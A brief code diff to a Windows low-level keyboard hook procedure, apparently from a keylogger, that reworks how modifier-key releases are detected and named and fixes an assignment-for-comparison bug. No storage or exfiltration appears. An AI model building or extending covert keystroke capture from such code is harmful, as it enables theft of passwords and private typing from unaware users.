@@ -48,8 +48,8 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
     }
     else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
     {
-        DWORD key = kbs->vkCode;
-        if( key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key = VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
+        //DWORD key = kbs->vkCode;
+        if( kbs->vkCode == VK_CONTROL || kbs->vkCode == VK_LCONTROL || kbs->vkCode == VK_RCONTROL || kbs->vkCode == VK_SHIFT || kbs->vkCode == VK_LSHIFT || kbs->vkCode == VK_RSHIFT || kbs->vkCode == VK_MENU || kbs->vkCode == VK_LMENU || kbs->vkCode == VK_RMENU || kbs->vkCode == VK_CAPITAL || kbs->vkCode == VK_NUMLOCK || kbs->vkCode == VK_LWIN || kbs->vkCode == VK_RWIN)
         {
             std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
             KeyName.insert(1,"/");
